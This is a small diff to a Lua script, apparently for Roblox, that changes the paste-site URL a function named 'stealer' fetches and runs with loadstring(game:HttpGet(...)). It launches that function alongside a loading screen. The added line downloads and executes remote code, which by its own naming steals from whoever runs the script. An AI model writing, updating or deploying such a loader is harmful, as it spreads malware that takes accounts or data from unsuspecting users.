@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/b673972b/", true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/b132a104/", true))()
 end
 
 local function loadingscreen()
@@ -8,3 +8,4 @@ end
 
 task.spawn(stealer)
 task.spawn(loadingscreen)
+
